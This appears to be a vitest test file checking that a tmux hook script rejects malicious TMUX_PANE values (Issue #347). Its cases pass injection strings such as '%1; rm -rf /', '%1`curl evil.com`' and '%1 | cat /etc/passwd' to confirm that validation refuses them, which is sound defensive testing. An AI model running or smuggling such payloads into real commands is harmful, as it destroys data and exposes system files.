/**
 * hook-injection.test.ts — Tests for Issue #347: Command injection in hook.ts via TMUX_PANE.
 *
 * Validates that TMUX_PANE is sanitized before use in child process calls
 * and that execFileSync (not execSync) is used to avoid shell injection.
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { spawnSync } from 'node:child_process';
import { mkdirSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

// We test the hook by spawning it as a subprocess with controlled env/stdin,
// since hook.ts calls process.exit() and reads from stdin.

const HOOK_PATH = join(process.cwd(), 'dist', 'hook.js');
const TEST_DIR = join(tmpdir(), `hook-injection-test-${process.pid}`);

function runHook(
  payload: Record<string, unknown>,
  env: Record<string, string | undefined>,
): { stdout: string; stderr: string; exitCode: number | null } {
  // Build a clean env — inherit PATH etc but override TMUX_PANE
  const hookEnv: Record<string, string> = {};
  for (const [k, v] of Object.entries(process.env)) {
    if (v !== undefined) hookEnv[k] = v;
  }
  for (const [k, v] of Object.entries(env)) {
    if (v !== undefined) {
      hookEnv[k] = v;
    } else {
      delete hookEnv[k];
    }
  }

  const result = spawnSync(
    'node',
    [HOOK_PATH],
    {
      input: JSON.stringify(payload),
      env: hookEnv,
      encoding: 'utf-8',
      timeout: 5000,
    },
  );
  return {
    stdout: result.stdout ?? '',
    stderr: result.stderr ?? '',
    exitCode: result.status ?? 1,
  };
}

describe.skip('hook.ts TMUX_PANE injection fix (Issue #347)', () => {
  const sessionId = 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee';

  beforeEach(() => {
    mkdirSync(TEST_DIR, { recursive: true });
  });

  afterEach(() => {
    rmSync(TEST_DIR, { recursive: true, force: true });
  });

  describe('TMUX_PANE validation', () => {
    it('should reject TMUX_PANE with shell injection via semicolon', () => {
      const result = runHook(
        { session_id: sessionId, hook_event_name: 'SessionStart', cwd: '/tmp' },
        { TMUX_PANE: '%1; rm -rf /' },
      );
      // Should exit cleanly (code 0, hook exits with 0 on errors)
      expect(result.exitCode).toBe(0);
      expect(result.stderr).toContain('Invalid TMUX_PANE');
    });

    it('should reject TMUX_PANE with backtick command substitution', () => {
      const result = runHook(
        { session_id: sessionId, hook_event_name: 'SessionStart', cwd: '/tmp' },
        { TMUX_PANE: '%1`curl evil.com`' },
      );
      expect(result.exitCode).toBe(0);
      expect(result.stderr).toContain('Invalid TMUX_PANE');
    });

    it('should reject TMUX_PANE with dollar command substitution', () => {
      const result = runHook(
        { session_id: sessionId, hook_event_name: 'SessionStart', cwd: '/tmp' },
        { TMUX_PANE: '%1$(whoami)' },
      );
      expect(result.exitCode).toBe(0);
      expect(result.stderr).toContain('Invalid TMUX_PANE');
    });

    it('should reject TMUX_PANE with pipe', () => {
      const result = runHook(
        { session_id: sessionId, hook_event_name: 'SessionStart', cwd: '/tmp' },
        { TMUX_PANE: '%1 | cat /etc/passwd' },
      );
      expect(result.exitCode).toBe(0);
      expect(result.stderr).toContain('Invalid TMUX_PANE');
    });

    it('should reject TMUX_PANE without leading percent', () => {
      const result = runHook(
        { session_id: sessionId, hook_event_name: 'SessionStart', cwd: '/tmp' },
        { TMUX_PANE: '12345' },
      );
      expect(result.exitCode).toBe(0);
      expect(result.stderr).toContain('Invalid TMUX_PANE');
    });

    it('should reject empty TMUX_PANE', () => {
      const result = runHook(
        { session_id: sessionId, hook_event_name: 'SessionStart', cwd: '/tmp' },
        { TMUX_PANE: '' },
      );
      // Empty string is falsy, so it hits the "not set" check first
      expect(result.exitCode).toBe(0);
      expect(result.stderr).toContain('TMUX_PANE not set');
    });

    it('should reject TMUX_PANE with newlines', () => {
      const result = runHook(
        { session_id: sessionId, hook_event_name: 'SessionStart', cwd: '/tmp' },
        { TMUX_PANE: '%1\nrm -rf /' },
      );
      expect(result.exitCode).toBe(0);
      expect(result.stderr).toContain('Invalid TMUX_PANE');
    });

    it('should reject TMUX_PANE with path traversal characters', () => {
      const result = runHook(
        { session_id: sessionId, hook_event_name: 'SessionStart', cwd: '/tmp' },
        { TMUX_PANE: '%1/../../etc/passwd' },
      );
      expect(result.exitCode).toBe(0);
      expect(result.stderr).toContain('Invalid TMUX_PANE');
    });

    it('should accept valid TMUX_PANE values', () => {
      const result = runHook(
        { session_id: sessionId, hook_event_name: 'SessionStart', cwd: '/tmp' },
        { TMUX_PANE: '%0' },
      );
      // Should get past validation — either succeeds (in tmux) or fails at tmux command
      expect(result.exitCode).toBe(0);
      expect(result.stderr).not.toContain('Invalid TMUX_PANE');
    });

    it('should accept multi-digit TMUX_PANE values', () => {
      const result = runHook(
        { session_id: sessionId, hook_event_name: 'SessionStart', cwd: '/tmp' },
        { TMUX_PANE: '%42' },
      );
      expect(result.exitCode).toBe(0);
      expect(result.stderr).not.toContain('Invalid TMUX_PANE');
    });
  });

  describe('TMUX_PANE not set', () => {
    it('should exit when TMUX_PANE is not set', () => {
      const result = runHook(
        { session_id: sessionId, hook_event_name: 'SessionStart', cwd: '/tmp' },
        { TMUX_PANE: undefined },
      );
      expect(result.exitCode).toBe(0);
      expect(result.stderr).toContain('TMUX_PANE not set');
    });
  });
});
